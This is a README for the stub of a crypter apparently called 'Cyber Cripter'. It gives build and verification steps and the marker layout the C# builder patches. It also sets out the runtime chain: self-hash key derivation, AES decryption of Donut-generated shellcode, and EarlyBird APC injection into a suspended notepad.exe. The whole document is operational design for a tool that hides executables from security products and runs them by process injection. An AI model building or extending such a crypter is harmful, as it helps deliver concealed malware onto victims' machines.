# Stub template

Native C stub compiled once and bundled with the C# builder as a binary
template. The builder patches it on every encrypt operation — it never
recompiles the stub.

## Build prerequisites

- Visual Studio 2019 or 2022 with the **C++ Build Tools** workload (for `cl.exe`,
  `link.exe`, the Windows SDK headers, and `bcrypt.lib`).
- A "x64 Native Tools Command Prompt for VS" (the Start Menu has a shortcut
  installed by VS), or run `vcvars64.bat` manually to set up the env.

## Build

```cmd
build.bat
```

This produces `build\stub_template.exe` and auto-copies it to
`..\Cyber Cripter\Resources\stub_template.exe`, which is where the C# builder
loads it from at runtime.

## Verify the template is patchable

After building, do a quick sanity check on the section layout:

```cmd
dumpbin /headers build\stub_template.exe | findstr /B /C:"  SECTION HEADER" /C:"   .cdata" /C:"  virtual size" /C:"  size of raw data"
```

You want `.cdata` to:
1. Exist as a section.
2. Have **size of raw data ≥ 0x100040** (1 MiB plus the metadata struct).
   If `size of raw data` is `0`, MSVC put the data in BSS and the magic
   markers won't be on disk for the builder to find. In that case bump the
   non-zero initializers in `g_half1_buf` (e.g. add a few `0xCC` bytes near
   the end) and rebuild.
3. Start at a file offset > `0x1000` so the `STABLE_REGION` (first 4 KiB
   hashed by both builder and stub) does not overlap any patched bytes.
   Standard MSVC layouts put `.cdata` after `.text` and `.rdata`, so this
   is normally far past `0x1000`.

## Layout patched by the builder

`.cdata` section contains, located by 16-byte magic prefixes:

| Field            | Source magic                              | Size                |
|------------------|-------------------------------------------|---------------------|
| `g_meta`         | `M E T A ! C R Y p T e R ! AA BB CC`      | 60 bytes            |
| `g_half1_buf`    | `H A L F ! O N E ! D A T A DD EE FF`      | 16 + 1 MiB capacity |

PE overlay (after the last section): ciphertext `half2` raw bytes.

## Runtime behavior

1. `GetModuleFileNameA` + `ReadFile` — read self file from disk.
2. SHA-256 over `heap_marker || self_bytes[0..hash_region_size] || timestamp`.
   The first 32 bytes of the hash is the AES-256 key.
3. Reassemble ciphertext: `g_half1_buf[16..16+half1_size]` concatenated with
   the last `half2_size` bytes of the file (PE overlay).
4. AES-256-CBC decrypt with PKCS#7 padding using the derived key and the IV
   stored in `g_meta.iv`.
5. EarlyBird APC injection into a `notepad.exe` started with `CREATE_SUSPENDED`:
   `VirtualAllocEx` RWX → `WriteProcessMemory` shellcode →
   `QueueUserAPC((PAPCFUNC)mem, hThread, 0)` → `ResumeThread`.

The plaintext payload is expected to be **position-independent shellcode**
(produced by Donut from the original `.exe`); the EarlyBird APC technique
cannot execute a raw PE.
